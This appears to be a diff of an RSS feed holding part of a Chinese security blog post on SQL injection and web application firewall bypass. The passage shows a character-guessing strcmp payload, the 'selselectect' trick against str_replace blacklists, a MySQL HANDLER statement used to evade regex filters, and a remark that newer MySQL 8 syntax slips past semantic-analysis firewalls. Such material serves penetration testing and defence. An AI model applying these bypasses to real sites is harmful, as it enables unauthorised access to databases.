 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x71</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="补充进行过滤的几种思路">补充：进行过滤的几种思路</h2>
-<h3 id="黑名单字符替换">黑名单字符替换</h3>
+</div><h2 id="补充进行过滤的几种思路"><a href="#补充进行过滤的几种思路" class="header-mark headerLink">补充：进行过滤的几种思路</a></h2>
+<h3 id="黑名单字符替换"><a href="#黑名单字符替换" class="header-mark headerLink">黑名单字符替换</a></h3>
 <p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p>
 <p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p>
-<h3 id="正则匹配">正则匹配</h3>
+<h3 id="正则匹配"><a href="#正则匹配" class="header-mark headerLink">正则匹配</a></h3>
 <p>在一些waf或者cms会见到类似如下的防护代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1509,7 +1509,7 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">handler</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="k">first</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="语义分析">语义分析</h3>
+</div><h3 id="语义分析"><a href="#语义分析" class="header-mark headerLink">语义分析</a></h3>
 <p>这是最高级的方式，模仿MySQL对SQL的分析，waf对用户的输入进行语法语义分析，如果符合MySQL的语法，就判断为SQL注入从而阻断</p>
 <p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
 <p>例如我们上面说的MySQL8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item></channel></rss>
